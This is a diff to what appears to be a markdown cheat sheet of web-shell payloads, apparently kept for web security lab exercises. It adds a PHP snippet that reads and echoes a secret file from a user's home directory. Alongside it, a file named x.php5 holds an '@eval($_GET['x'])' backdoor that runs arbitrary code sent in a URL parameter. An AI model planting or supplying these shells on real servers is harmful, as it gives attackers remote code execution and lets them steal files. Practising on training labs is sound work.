@@ -3,6 +3,9 @@
 ---
 ## web-shell
 
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
 *x.php5*
 ```php
 <?php @eval($_GET['x']);
